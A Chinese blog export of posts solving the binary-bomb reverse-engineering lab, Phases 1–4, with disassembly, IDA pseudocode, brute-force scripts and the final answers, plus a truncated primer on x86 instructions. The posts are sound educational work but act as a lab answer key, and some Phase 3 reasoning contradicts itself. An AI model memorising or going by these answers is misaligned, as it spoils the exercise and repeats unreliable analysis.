五、每日一句若不想做，会找一个或无数个借口；你若想做，会想一个或无数个办法]]></content>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二进制炸弹：Phase_4解题总结]]></title>
    <url>%2F2019%2F04%2F21%2F2019.04.21%EF%BC%8843%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 前言：&nbsp;&nbsp;&nbsp;&nbsp;今天我将对Phase_4做详细的总结，并在总结过程中解决了在上道题（Phase_3）中遇到的问题，所以今天对我的收获是蛮大的，下面就详细的总结一下我在Phase_4的解题过程吧！ 一、相关汇编代码1.&lt; phase_4 &gt;的汇编代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464708048cf3 &lt;phase_4&gt;: 8048cf3: 83 ec 2c sub $0x2c,%esp 8048cf6: 8d 44 24 1c lea 0x1c(%esp),%eax 8048cfa: 89 44 24 0c mov %eax,0xc(%esp) 8048cfe: 8d 44 24 18 lea 0x18(%esp),%eax 8048d02: 89 44 24 08 mov %eax,0x8(%esp) // 这里是我们要输入具体的内容类型 8048d06: c7 44 24 04 ef a2 04 movl $0x804a2ef,0x4(%esp) 8048d0d: 08 8048d0e: 8b 44 24 30 mov 0x30(%esp),%eax 8048d12: 89 04 24 mov %eax,(%esp) // 调用输入函数 8048d15: e8 46 fb ff ff call 8048860 &lt;__isoc99_sscanf@plt&gt; // 将eax（输入参数的个数）与2相比较，如果eax≠2，则跳转到8048d26，调用bomb函数；如果二者相等，则继续向下执行命令行； 8048d1a: 83 f8 02 cmp $0x2,%eax 8048d1d: 75 07 jne 8048d26 &lt;phase_4+0x33&gt; // 将输入的第一个数值与14相比，如果 ≤14 则跳转到8048d2b，否则就执行bomb； 8048d1f: 83 7c 24 18 0e cmpl $0xe,0x18(%esp) 8048d24: 76 05 jbe 8048d2b &lt;phase_4+0x38&gt; 8048d26: e8 da 03 00 00 call 8049105 &lt;explode_bomb&gt; 8048d2b: c7 44 24 08 0e 00 00 movl $0xe,0x8(%esp) 8048d32: 00 8048d33: c7 44 24 04 00 00 00 movl $0x0,0x4(%esp) 8048d3a: 00 8048d3b: 8b 44 24 18 mov 0x18(%esp),%eax 8048d3f: 89 04 24 mov %eax,(%esp) // 调用func4函数，该函数的地址为8048c96 8048d42: e8 4f ff ff ff call 8048c96 &lt;func4&gt; // 将func4函数输出的结果与19（十六进制为0x13）比较，如果两者不相等，则跳转到8048d53，执行bomb；两者相等的话，则继续向下执行指令； 8048d47: 83 f8 13 cmp $0x13,%eax 8048d4a: 75 07 jne 8048d53 &lt;phase_4+0x60&gt; // 将输入的第二个数据也与19相比，如果输入的数值等于19，则跳转到8048d58，程序执行完毕；如果不相等的话，则调用bomb函数； 8048d4c: 83 7c 24 1c 13 cmpl $0x13,0x1c(%esp) 8048d51: 74 05 je 8048d58 &lt;phase_4+0x65&gt; 8048d53: e8 ad 03 00 00 call 8049105 &lt;explode_bomb&gt; // Finish程序段 8048d58: 83 c4 2c add $0x2c,%esp 8048d5b: c3 ret 2.func4() 函数的汇编代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585908048c96 &lt;func4&gt;: /* Set up段 */ 8048c96: 56 push %esi 8048c97: 53 push %ebx 8048c98: 83 ec 14 sub $0x14,%esp // edx为第一个参数 a1 8048c9b: 8b 54 24 20 mov 0x20(%esp),%edx // eax为第二个参数 a2 8048c9f: 8b 44 24 24 mov 0x24(%esp),%eax // esi为第三个参数 a3 8048ca3: 8b 74 24 28 mov 0x28(%esp),%esi 8048ca7: 89 f1 mov %esi,%ecx /* Body */ // t1 = a3 - a2 8048ca9: 29 c1 sub %eax,%ecx // 将计算的结果放到寄存器%ebx中 8048cab: 89 cb mov %ecx,%ebx // 将ebx逻辑右移； 8048cad: c1 eb 1f shr $0x1f,%ebx // 将ebx 与 ecx相加； 8048cb0: 01 d9 add %ebx,%ecx // ecx算术右移一位，也就是ecx中的数值 / 2； 8048cb2: d1 f9 sar %ecx 8048cb4: 8d 1c 01 lea (%ecx,%eax,1),%ebx // 将edx与ebx中的数值相比较，如果（v3 + a2）ebx ≤ edx（a1）则跳转到8048cd2；如果ebx ≤ edx则继续往下执行指令； 8048cb7: 39 d3 cmp %edx,%ebx 8048cb9: 7e 17 jle 8048cd2 &lt;func4+0x3c&gt; 8048cbb: 8d 4b ff lea -0x1(%ebx),%ecx 8048cbe: 89 4c 24 08 mov %ecx,0x8(%esp) 8048cc2: 89 44 24 04 mov %eax,0x4(%esp) 8048cc6: 89 14 24 mov %edx,(%esp) // 调用fun4() 函数，那么在调用func4() 函数中，可能会再次调用该函数，从这里可以看出应该是递归函数； 8048cc9: e8 c8 ff ff ff call 8048c96 &lt;func4&gt; //将func4() 输出的数值与ebx中的数据（v4）相加，再无条件跳转到8048ced处； 8048cce: 01 d8 add %ebx,%eax 8048cd0: eb 1b jmp 8048ced &lt;func4+0x57&gt; // 若上述的代码中（v3 + a2）ebx ≤ edx（a1）则条状到这里；将ebx中的数据放到eax中（result = v4）； 8048cd2: 89 d8 mov %ebx,%eax // 比较ebx（v4）与edx（a1）的大小，如果ebx ≥ edx则跳转到8048ced，func4()函数执行完毕； 8048cd4: 39 d3 cmp %edx,%ebx 8048cd6: 7d 15 jge 8048ced &lt;func4+0x57&gt; 8048cd8: 89 74 24 08 mov %esi,0x8(%esp) 8048cdc: 8d 43 01 lea 0x1(%ebx),%eax 8048cdf: 89 44 24 04 mov %eax,0x4(%esp) 8048ce3: 89 14 24 mov %edx,(%esp) 8048ce6: e8 ab ff ff ff call 8048c96 &lt;func4&gt; 8048ceb: 01 d8 add %ebx,%eax /* Finish段 */ 8048ced: 83 c4 14 add $0x14,%esp 8048cf0: 5b pop %ebx 8048cf1: 5e pop %esi 8048cf2: c3 ret 二、相关伪代码（IDA反编译）1.Phase_4的伪代码12345678910111213int __cdecl phase_4(int a1)&#123; int result; // eax@4 int v2; // [sp+18h] [bp-14h]@1 int v3; // [sp+1Ch] [bp-10h]@1 if ( __isoc99_sscanf(a1, &quot;%d %d&quot;, &amp;v2, &amp;v3) != 2 || (unsigned int)v2 &gt; 0xE ) explode_bomb(); result = func4(v2, 0, 14); if ( result != 19 || v3 != 19 ) explode_bomb(); return result;&#125; 2.func4() 函数的伪代码1234567891011121314151617181920int __cdecl func4(int a1, int a2, int a3)&#123; int v3; // ecx@1 int v4; // ebx@1 int result; // eax@2 v3 = (a3 - a2) / 2; v4 = v3 + a2; if ( v3 + a2 &lt;= a1 ) &#123; result = v3 + a2; if ( v4 &lt; a1 ) result = v4 + func4(a1, v4 + 1, a3); &#125; else &#123; result = v4 + func4(a1, a2, v4 - 1); &#125; return result;&#125; 三、代码分析1.Phase_4函数的功能 通过对汇编代码和伪代码的综合分析，对Phase_4的功能有了如下的大概认识： 8048d06：要求输入2个整型数值：v2，v3；// __isoc99_sscanf(a1, “%d %d”, &amp;v2, &amp;v3) 8048d1f：判读输入参数的个数是否等于2，以及输入的第一个数值是否小于等于14，如果参数的个数不等于2，以及第一个数据大于14的话，则bomb。也就是说我们必须要输入两个数字，且输入的第一个数字必须要 ≤14 ；// if ( __isoc99_sscanf(a1, “%d %d”, &amp;v2, &amp;v3) != 2 || (unsigned int)v2 &gt; 14 )&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;explode_bomb(); 8048d42：调用func4() 函数，返回一个result；// result = func4(v2, 0, 14); 8048d47：将func4() 返回的result与19相比，如果两者不相等则bomb；// if ( result != 19 || v3 != 19 )&nbsp;&nbsp;&nbsp;&nbsp; explode_bomb(); 8048d4c：将输入的第二个数据也与19相比，如果两者不相等则bomb，相等的话则 return 1； // if ( result != 19 || v3 != 19 )&nbsp;&nbsp;&nbsp;&nbsp;explode_bomb(); 2.func4()函数代码分析 现在再针对func4()函数的功能做一下分析：通过上文的汇编和伪代码，以及对汇编代码的分析，可以得到func4( ) 函数是一个递归函数，通过参数传递，在多重递归反复计算下，可以返回一个最终的结果 3.解题思路 经过上面对 Phase_4和func4()函数的分析，可以清晰的知道了这一关的要求以及做题的思路： 首先弄清楚我们需要输入两个整型数据； 第一个数据要在[0，14]范围内； 第二个数据要等于19； 紧接着调用一个递归函数func4()，要把输入的第一个数据作为形参之一，传给func4()； 要通过func4(v2,0,14)函数求得result的值，并且求得的值应为19，同时也能求得第一个数据的值； 若满足上述五个条件，则通关。 四、解题过程1.查看输入的数据格式通过x/1s 0x804a2ef来查看需要输入的格式，需要输入的数据为两个整数类型，如下图所示： 2.计算第一个数值 从上述分析中可以得到第一个数据为：[0,14]中的一个，并且该数据作为func4()的一个形参，算出最后的结果为19，那么关键就是通过func4()函数，看谁的结果为19：① 编写脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于一个递归函数如何求得最终的result呢？我一开始就是尝试了自己手工计算，但是越往下算啊越发现越复杂，于是果断的放弃，就选择了第二种方案：机器计算。一开始我用的是C++写的脚本，但是因为我现在初学python，所以我又尝试了用python写了一个脚本。 ☛ C++脚本:123456789101112131415161718192021222324252627282930313233#include&lt;iostream&gt;using namespace std;int func4(int a1,int a2,int a3);void main()&#123; int x,result; for(x=0;x&lt;=14;x++) &#123; result = func4(x,0,14); cout&lt;&lt;&quot;x is &quot;&lt;&lt;x&lt;&lt;&apos;\n&apos;&lt;&lt;&quot;result is &quot;&lt;&lt;result&lt;&lt;&apos;\n&apos;&lt;&lt;&apos;\n&apos;; &#125;&#125;int func4(int a1,int a2,int a3)&#123; int v3; // ecx@1 int v4; // ebx@1 int result; // eax@2 v3 = (a3 - a2) / 2; v4 = v3 + a2; if ( v3 + a2 &lt;= a1 ) &#123; result = v3 + a2; if ( v4 &lt; a1 ) result = v4 + func4(a1, v4 + 1, a3); &#125; else &#123; result = v4 + func4(a1, a2, v4 - 1); &#125; return result;&#125; ☛ python 脚本:1234567891011121314def func4(num,a2,a3): v3 = (a3 - a2) / 2 v4 = v3 + a2 if v3 + a2 &lt;= num: result = v3 + a2 if v4 &lt; num: result = v4 + func4(num,v4 + 1,a3); else: result = v4 + func4(num,a2,v4 - 1); return resultfor num in range(0,14): result = func4(num,0,14); print &quot;x is:&quot;,num,&quot;result is:&quot;,result ② 执行脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的程序均可正常执行。下面我只会贴出python版本的答案：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从所得结果来看，可以很清楚的看到输出结果为19，所对应的 x（也就是我们输入的第一个数据）为 4 ，那么我们便得到了第一个数据为 4； 3.得第二个数据 通过上文的代码分析和解题思路模块，可以得出第二个数据为 19； 4.整理答案 综上所述，Phase_4的通关答案为：4 19 四、验证答案输入 4 19，得到的结果如下：说明该答案正确！ 五、学习感悟在今天做题的时候，忽然发现解决了昨天的问题，我明天再将昨天的问题进行更改和总结。有问题不可怕，可怕的是遇见问题就退缩。不管怎么样，以后的我 还是会认真的坚持，对发现的问题及时解决，及时总结！ 七、每日一句一般人会在困境面前浑身发抖，而成大事者则能把困境变为成功的有力跳板。]]></content>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二进制炸弹：Phase_3解题总结]]></title>
    <url>%2F2019%2F04%2F20%2F2019.04.20%EF%BC%8842%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 前言：&nbsp;&nbsp;&nbsp;&nbsp;今天又注重的对Phase_3进行了总结，顺利的通过Phase_3。那么今天就总结一下我的大体做题思路吧。 一、相关汇编代码① &lt; phase_3 &gt;的汇编代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626308048c02 &lt;phase_3&gt;: 8048c02: 83 ec 2c sub $0x2c,%esp 8048c05: 8d 44 24 1c lea 0x1c(%esp),%eax 8048c09: 89 44 24 0c mov %eax,0xc(%esp) 8048c0d: 8d 44 24 18 lea 0x18(%esp),%eax 8048c11: 89 44 24 08 mov %eax,0x8(%esp) // 通过x/1s 0x804a2ef可以看到这里需要输入两个整型数值； 8048c15: c7 44 24 04 ef a2 04 movl $0x804a2ef,0x4(%esp) 8048c1c: 08 8048c1d: 8b 44 24 30 mov 0x30(%esp),%eax 8048c21: 89 04 24 mov %eax,(%esp) // 调用8048860的函数，将返回的参数的个数与1相比较，若大于1，则跳转到8048c33，小于等于1 则bomb； 8048c24: e8 37 fc ff ff call 8048860 &lt;__isoc99_sscanf@plt&gt; 8048c29: 83 f8 01 cmp $0x1,%eax 8048c2c: 7f 05 jg 8048c33 &lt;phase_3+0x31&gt; 8048c2e: e8 d2 04 00 00 call 8049105 &lt;explode_bomb&gt; // 8048c2c处的跳转跳到这里，又将第一个数值与7相比，若大于7，则跳转到8048c76，执行bomb，若小于等于7，则执行8048c3a处的指令； 8048c33: 83 7c 24 18 07 cmpl $0x7,0x18(%esp) 8048c38: 77 3c ja 8048c76 &lt;phase_3+0x74&gt; // 将输入的第一个数值送到%eax中，然后跳转到0x804a180 + 4 * eax的地址； 8048c3a: 8b 44 24 18 mov 0x18(%esp),%eax 8048c3e: ff 24 85 80 a1 04 08 jmp *0x804a180(,%eax,4) // 从8048c45 —— 8048c74 都是将指定位置的数值送到寄存器%eax中，然后跳转到8048c87（可以发现这里是个switch语句）； 8048c45: b8 7f 01 00 00 mov $0x17f,%eax 8048c4a: eb 3b jmp 8048c87 &lt;phase_3+0x85&gt; 8048c4c: b8 ff 01 00 00 mov $0x1ff,%eax 8048c51: eb 34 jmp 8048c87 &lt;phase_3+0x85&gt; 8048c53: b8 78 00 00 00 mov $0x78,%eax 8048c58: eb 2d jmp 8048c87 &lt;phase_3+0x85&gt; 8048c5a: b8 bf 02 00 00 mov $0x2bf,%eax 8048c5f: eb 26 jmp 8048c87 &lt;phase_3+0x85&gt; 8048c61: b8 08 03 00 00 mov $0x308,%eax 8048c66: eb 1f jmp 8048c87 &lt;phase_3+0x85&gt; 8048c68: b8 49 01 00 00 mov $0x149,%eax 8048c6d: eb 18 jmp 8048c87 &lt;phase_3+0x85&gt; 8048c6f: b8 43 02 00 00 mov $0x243,%eax 8048c74: eb 11 jmp 8048c87 &lt;phase_3+0x85&gt; // 调用bomb 8048c76: e8 8a 04 00 00 call 8049105 &lt;explode_bomb&gt; 8048c7b: b8 00 00 00 00 mov $0x0,%eax 8048c80: eb 05 jmp 8048c87 &lt;phase_3+0x85&gt; 8048c82: b8 b2 00 00 00 mov $0xb2,%eax // 将根据第一个数据得到的数值，与一开始输入的第二个数据进行比较：如果两者相等，则跳转至8048c92处；不相等则执行bomb； 8048c87: 3b 44 24 1c cmp 0x1c(%esp),%eax 8048c8b: 74 05 je 8048c92 &lt;phase_3+0x90&gt; 8048c8d: e8 73 04 00 00 call 8049105 &lt;explode_bomb&gt; 8048c92: 83 c4 2c add $0x2c,%esp 8048c95: c3 ret 二、相关伪代码（IDA反编译）① Phase_3的伪代码123456789101112131415161718192021222324252627282930313233343536373839404142signed int __cdecl phase_3(int a1)&#123; signed int result; // eax@4 int v2; // [sp+18h] [bp-14h]@1 int v3; // [sp+1Ch] [bp-10h]@1 if ( __isoc99_sscanf(a1, &quot;%d %d&quot;, &amp;v2, &amp;v3) &lt;= 1 ) explode_bomb(); switch ( v2 ) &#123; case 0: result = 383; break; case 2: result = 511; break; case 3: result = 120; break; case 4: result = 703; break; case 5: result = 776; break; case 6: result = 329; break; case 7: result = 579; break; case 1: result = 178; break; default: explode_bomb(); return result; &#125; if ( result != v3 ) explode_bomb(); return result;&#125; 三、代码分析1.Phase_3函数的功能 通过对汇编代码和伪代码的综合分析，对Phase_3的功能有了如下的大概认识： 8048c15：要求输入2个整型数值；// __isoc99_sscanf&nbsp;&nbsp;&nbsp;&nbsp;(a1, “%d %d”, &amp;v2, &amp;v3) 8048c29：判读输入参数的个数 &lt;= 1，如果小于等于1，则bomb，大于1就继续执行下面的指令，根据上文也就是说我们输入的第一个数字必须要等于 2；// if ( __isoc99_sscanf(a1, “%d %d”, &amp;v2, &amp;v3) &lt;= 1 )&nbsp;&nbsp;&nbsp;&nbsp;explode_bomb(); 8048c33：还要求第一个数字不能大于7，否则就bomb；// default:&nbsp;&nbsp;&nbsp;&nbsp; explode_bomb(); 8048c87：将在switch得到的result和输入的第二个数据（v3）进行比较，如果不相同的话，则bomb；// if ( result != v3 )&nbsp;&nbsp;&nbsp;&nbsp;explode_bomb(); 2.解题思路 经过上面四步的分析，可以清晰的知道了这一关的要求以及做题的思路： 首先弄清楚我们需要输入两个整型数据； 第一个数据要在[0，7]范围内； 第二个数据要与switch语句中相应case对应的result相等。 若满足上述两个条件，则通关。 四、解题过程 需要输入的数据通过x/1s 0x804a2ef来查看需要输入的格式： 得出第一个数值从上述分析中可以得到第一个数据为：[0，7] 得出第二个数值通过对bomb文件反编译，得到可执行程序的伪代码，那么在为代码中可以很简单的得到第二个数值： case 0：result = 383; case 1：result = 178; case 2：result = 511; case 3：result = 120; case 4：result = 703; case 5：result = 776; case 6：result = 329; case 7：result = 579; 得到答案因为第一个数据取值范围为：(1，7]，所以第三关有 6 种答案：`0 383；1 178；2 511；3 120；4 703；5 776；6 329；7 579`四、验证答案 0 383的结果输出如下： 1 178的结果输出如下： 2 511的结果输出如下： 3 120的结果输出如下： 4 703的结果输出如下： 5 776的结果输出如下： 6 329的结果输出如下： 7 579的结果输出如下：六、学习感悟今天的感悟还是和昨天一样，在做题和总结时，完全是两个不同的状态，通过总结能够把我做题时的问题、没有想到的知识点，完全地暴露在我的眼前，并且还出现了一下“意料之外”的问题。不过通过总结，让我对知识点有了更深的认识和感悟，也让我真正的把有关知识点去落实。七、每日一句人生的挑战，无处不在，满怀信心，轻装上路，明天永远是充满希望的战场。]]></content>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二进制炸弹：Phase_2解题总结]]></title>
    <url>%2F2019%2F04%2F19%2F2019.04.19%EF%BC%8841%EF%BC%89%2F</url>
    <content type="text"><![CDATA[今天对以前的博文的一些地方进行了补充，也再总结一下Phase_2有关内容。 一、相关汇编代码① &lt; phase_2 &gt;的汇编代码123456789101112131415161718192021222324252627282930313233343536373839404142434408048bb4 &lt;phase_2&gt;: //执行push栈 8048bb4: 56 push %esi 8048bb5: 53 push %ebx 8048bb6: 83 ec 34 sub $0x34,%esp 8048bb9: 8d 44 24 18 lea 0x18(%esp),%eax 8048bbd: 89 44 24 04 mov %eax,0x4(%esp) 8048bc1: 8b 44 24 40 mov 0x40(%esp),%eax 8048bc5: 89 04 24 mov %eax,(%esp) //调用 804912c处的地址：要求输入 6 个数字 8048bc8: e8 5f 05 00 00 call 804912c &lt;read_six_numbers&gt; //将esp+0x18地址处的内容与 1 作比较，如果相等则跳转，不相等则bomb 8048bcd: 83 7c 24 18 01 cmpl $0x1,0x18(%esp) 8048bd2: 74 1e je 8048bf2 &lt;phase_2+0x3e&gt; 8048bd4: e8 2c 05 00 00 call 8049105 &lt;explode_bomb&gt; 8048bd9: eb 17 jmp 8048bf2 &lt;phase_2+0x3e&gt; //8048bfa处的无条件跳转到这里，两个数相加，并与%ebx中的数值比较，如果相等则跳转到8048be9 8048bdb: 8b 43 fc mov -0x4(%ebx),%eax 8048bde: 01 c0 add %eax,%eax 8048be0: 39 03 cmp %eax,(%ebx) 8048be2: 74 05 je 8048be9 &lt;phase_2+0x35&gt; 8048be4: e8 1c 05 00 00 call 8049105 &lt;explode_bomb&gt; //8048be9 处的 je 跳转到这里，ebx = ebx + 4；将ebx与esi进行比较，不相等则跳转到8048bdb，相等则无条件跳转到8048bfc处（在这里会形成一个循环） 8048be9: 83 c3 04 add $0x4,%ebx 8048bec: 39 f3 cmp %esi,%ebx 8048bee: 75 eb jne 8048bdb &lt;phase_2+0x27&gt; 8048bf0: eb 0a jmp 8048bfc &lt;phase_2+0x48&gt; //8048bd2处的 je 跳转到这里（第一个数字为 1 时），将两个地址分别放到ebx、esi中，然后无条件跳转到8048bdb 8048bf2: 8d 5c 24 1c lea 0x1c(%esp),%ebx 8048bf6: 8d 74 24 30 lea 0x30(%esp),%esi 8048bfa: eb df jmp 8048bdb &lt;phase_2+0x27&gt; //8048bf0处的 jmp 跳转到这里，执行pop栈 8048bfc: 83 c4 34 add $0x34,%esp 8048bff: 5b pop %ebx 8048c00: 5e pop %esi 8048c01: c3 ret ② 0804912c的汇编代码主要部分123456789101112130804912c &lt;read_six_numbers&gt;: …… …… …… //调用输入函数（8048860），将eax与 5 作比较，如果eax &gt; 5则跳转到8049178，小于等于的话则bomb 8049169: e8 f2 f6 ff ff call 8048860 &lt;__isoc99_sscanf@plt&gt; 804916e: 83 f8 05 cmp $0x5,%eax 8049171: 7f 05 jg 8049178 &lt;read_six_numbers+0x4c&gt; 8049173: e8 8d ff ff ff call 8049105 &lt;explode_bomb&gt; 8049178: 83 c4 2c add $0x2c,%esp 804917b: c3 ret 二、相关伪代码（IDA反编译）① Phase_2的伪代码12345678910111213141516171819202122int __cdecl phase_2(int a1)&#123; int result; // eax@3 char *v2; // ebx@5 int v3; // [sp+18h] [bp-24h]@1 char v4; // [sp+1Ch] [bp-20h]@7 char v5; // [sp+30h] [bp-Ch]@5 read_six_numbers(a1, (int)&amp;v3); if ( v3 != 1 ) explode_bomb(); v2 = &amp;v4; do &#123; result = 2 * *((_DWORD *)v2 - 1); if ( *(_DWORD *)v2 != result ) explode_bomb(); v2 += 4; &#125; while ( v2 != &amp;v5 ); return result;&#125; ② read_six_numbers() 的伪代码123456789int __cdecl read_six_numbers(int a1, int a2)&#123; int result; // eax@1 result = __isoc99_sscanf(a1, (const char *)&amp;unk_804A2E3, a2, a2 + 4, a2 + 8, a2 + 12, a2 + 16, a2 + 20); if ( result &lt;= 5 ) explode_bomb(); return result;&#125; 三、代码分析1.Phase_2函数的功能 ① 正向思维通过对汇编代码和伪代码的分析，对Phase_2的功能有了大概的认识： 8048bc8：首先要求输入六个数字； // read_six_numbers(a1, (int)&v3); 804916e：判读输入的数字数量是否小于5，也可以说循环5次，不符合则bomb； // if ( result]]></content>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二进制炸弹：Phase_1解题总结]]></title>
    <url>%2F2019%2F04%2F18%2F2019.04.18%EF%BC%8840%EF%BC%89%2F</url>
    <content type="text"><![CDATA[经过这一段时间的学习，在掌握了汇编语言的大概内容，并对二进制炸弹中可能出现的知识点总结后，今天终于开始了二进制炸弹的解题，今天主要做的是以下的阶段： ☛ Phase_1、Phase_2、Phase_3、Phase_4今天主要总结一下Phase_1的解题过程 一、前期工作 所用工具IDA、Linux系统、gdb、objdump、python 解题思路通过对可执行文件的汇编语言和伪代码分析，再利用python语言写出一定的脚本，从而进行解题。二、Phase_1解题过程1.对bomb文件进行反汇编objdump -d bomb &gt; bomo.txt将bomb的汇编代码写入 bomb.txt 中去，并找到Phase_x的相关位置。2.Phase_1的相关汇编代码① Phase_1主体汇编代码123456789101112131408048b90 &lt;phase_1&gt;: 8048b90: 83 ec 1c sub $0x1c,%esp 8048b93: c7 44 24 04 24 a1 04 movl $0x804a124,0x4(%esp) 8048b9a: 08 8048b9b: 8b 44 24 20 mov 0x20(%esp),%eax 8048b9f: 89 04 24 mov %eax,(%esp) 8048ba2: e8 53 04 00 00 call 8048ffa &lt;strings_not_equal&gt; 8048ba7: 85 c0 test %eax,%eax 8048ba9: 74 05 je 8048bb0 &lt;phase_1+0x20&gt; 8048bab: e8 55 05 00 00 call 8049105 &lt;explode_bomb&gt; 8048bb0: 83 c4 1c add $0x1c,%esp 8048bb3: c3 ret ② 8048ffa地址&lt; string_not_equal &gt;的汇编代码12345678910111213141516171819202122232425262728293031323334353637383940414208048ffa &lt;strings_not_equal&gt;: 8048ffa: 57 push %edi 8048ffb: 56 push %esi 8048ffc: 53 push %ebx 8048ffd: 83 ec 04 sub $0x4,%esp 8049000: 8b 5c 24 14 mov 0x14(%esp),%ebx 8049004: 8b 74 24 18 mov 0x18(%esp),%esi 8049008: 89 1c 24 mov %ebx,(%esp) 804900b: e8 cb ff ff ff call 8048fdb &lt;string_length&gt; 8049010: 89 c7 mov %eax,%edi 8049012: 89 34 24 mov %esi,(%esp) 8049015: e8 c1 ff ff ff call 8048fdb &lt;string_length&gt; 804901a: ba 01 00 00 00 mov $0x1,%edx 804901f: 39 c7 cmp %eax,%edi 8049021: 75 3a jne 804905d &lt;strings_not_equal+0x63&gt; 8049023: 0f b6 03 movzbl (%ebx),%eax 8049026: 84 c0 test %al,%al 8049028: 74 20 je 804904a &lt;strings_not_equal+0x50&gt; 804902a: 3a 06 cmp (%esi),%al 804902c: 74 08 je 8049036 &lt;strings_not_equal+0x3c&gt; 804902e: 66 90 xchg %ax,%ax 8049030: eb 1f jmp 8049051 &lt;strings_not_equal+0x57&gt; 8049032: 3a 06 cmp (%esi),%al 8049034: 75 22 jne 8049058 &lt;strings_not_equal+0x5e&gt; 8049036: 83 c3 01 add $0x1,%ebx 8049039: 83 c6 01 add $0x1,%esi 804903c: 0f b6 03 movzbl (%ebx),%eax 804903f: 84 c0 test %al,%al 8049041: 75 ef jne 8049032 &lt;strings_not_equal+0x38&gt; 8049043: ba 00 00 00 00 mov $0x0,%edx 8049048: eb 13 jmp 804905d &lt;strings_not_equal+0x63&gt; 804904a: ba 00 00 00 00 mov $0x0,%edx 804904f: eb 0c jmp 804905d &lt;strings_not_equal+0x63&gt; 8049051: ba 01 00 00 00 mov $0x1,%edx 8049056: eb 05 jmp 804905d &lt;strings_not_equal+0x63&gt; 8049058: ba 01 00 00 00 mov $0x1,%edx 804905d: 89 d0 mov %edx,%eax 804905f: 83 c4 04 add $0x4,%esp 8049062: 5b pop %ebx 8049063: 5e pop %esi 8049064: 5f pop %edi 8049065: c3 ret 3.解题过程 ① 代码分析&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由Phase_1主体的汇编 代码可以得出，将0x804a124地址出的内容放到%esp + 0x4中，然后将读入32（0x20）位长的字符串放入到%eax中，再调用8048ffa处的函数（比较字符串），比较输入的字符串和0x804a124地址的字符串(test指令)，如果相等则跳转到8048bb0（je指令），不相等的话则调用“爆炸”函数。② 验证分析&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对bomb文件进行反编译，得到Phase_1的伪代码：123456789int __cdecl phase_1(int a1)&#123; int result; // eax@1 result = strings_not_equal(a1, &quot;When I get angry, Mr. Bigglesworth gets upset.&quot;); if ( result ) explode_bomb(); return result;&#125; ③ 获取解除“解除炸弹”的字符串&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过伪代码可以看出，程序Phase_1是将输入的字符串a1与字符串“When I get angry, Mr. Bigglesworth gets upset.”进行比较，那么就可以得出0x804a124地址的字符串位上述字符串。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们也可以通过 x/2s 0x804a124来查看内存地址中的值，将该处的内容输出，如下图：④ 输入字符串，验证结果将得到的字符串输入，得到如下的提示：Phase 1 defused. How about the next one?，代表Phase_1通过: 三、学习感悟今天做完了Phase_1 to Phase_4 的题目，但是我想认真的再好好过一遍每一个知识点，就比如今天所提到的断点和跳转指令，就和我昨天总结的不一样（可能昨天总结的不够全面），所以我想认真的总结每个Phase，然后完善以前的博文，这样才会慢慢的充实。 四、每日一句每一个人的成功之路或许都不尽相同，但我相信，成功都需要每一位想成功的人去努力、去奋斗，而每一条成功之路，都是充满坎坷的，只有那些坚信自己目标，不断努力、不断奋斗的人，才能取得最终的成功。但有一点我始终坚信，那就是，当你能把自己感动得哭了的时候，你就成功了！]]></content>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二进制炸弹解题知识储备]]></title>
    <url>%2F2019%2F04%2F17%2F2019.04.17%EF%BC%8839%EF%BC%89%2F</url>
    <content type="text"><![CDATA[今天开始了第二阶段的测试，针对题目中频繁出现的汇编指令、gdb编译器以及objdump工具，做了详细的学习，下面就总结一下该题中可能用到的一些知识点，主要内容为： 常用的汇编指令 objdump工具 gdb编译器的用法一、题目中出现的汇编指令 push、pop、call、cmp、jmp、je、jne、lea 1.push 和 pop 指令：堆栈操作指令 ① 说明：无论是push 还是pop ，都是对堆栈段ss的处理： ss中存放堆栈段地址 sp指针中存放偏移地址， 栈操作都是以字（2字节）为单位。 ② 例子：☛ 例一：将通用寄存器ax中的数据入栈，push ax，在16位的汇编中，ax中存放的是两个字节单元。这句话的意思中包含了两个步骤：&nbsp;&nbsp;&nbsp;&nbsp;1）让sp=sp-2，即让sp指针向上移动两个存储单元；&nbsp;&nbsp;&nbsp;&nbsp;2）将ax中两个字节数据传送入sp指向的内存单元；相反，将通用寄存器ax中的数据出栈，pop ax，其中也包含了两个步骤：&nbsp;&nbsp;&nbsp;&nbsp;1）ss:sp指向的字数据传送给ax；&nbsp;&nbsp;&nbsp;&nbsp;2）让sp=sp+2，即让sp指针向下移动两个存储单元;☛ 例二：push [bx]，这条指令和push ds:[bx]的意思一样的，同上，分两步：&nbsp;&nbsp;&nbsp;&nbsp;1）让sp=sp-2；&nbsp;&nbsp;&nbsp;&nbsp;2）将ds:[bx]处的字数据传送给ss:sp指向的单元；同样，pop [bx]，和pop ds:[bx]同样意义，分两步：&nbsp;&nbsp;&nbsp;&nbsp;1）将ss:sp指向的字数据传送给个ds:[bx]所在的字单元。&nbsp;&nbsp;&nbsp;&nbsp;2）让sp=sp+2，即让ss:sp指针向下移动两个存储单元; 2.call 指令：过程调用指令 ① 格式：call 标号（将当前的IP压栈后，跳转到标号处执行指令）② 作用：就是将当前的程序指针（EIP寄存器）值保存到栈中（称为linking information），然后转移到（branch to）目标操作数所指定的函数（被调用过程）继续执行。③ 类型：根据被调用过程是否位于同一个代码段，CALL调用被分为近调用（Near Call）和远调用（Far 